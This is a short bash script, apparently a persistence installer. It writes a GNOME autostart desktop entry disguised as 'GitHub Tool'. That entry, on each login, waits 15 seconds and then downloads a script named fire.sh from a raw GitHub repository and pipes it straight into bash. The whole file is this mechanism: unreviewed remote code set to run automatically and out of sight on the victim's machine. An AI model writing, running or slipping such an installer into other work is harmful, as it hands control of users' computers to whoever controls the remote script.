#!/bin/bash
# auto_installer.sh

# Create autostart directory
mkdir -p ~/.config/autostart
# Create desktop entry
cat > ~/.config/autostart/github_tool.desktop << EOF
[Desktop Entry]
Type=Application
Name=GitHub Tool
Exec=bash -c "sleep 15 && curl -sL 'https://raw.githubusercontent.com/Cybergho5tX/chicken/refs/heads/main/fire.sh' | bash"
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
EOF


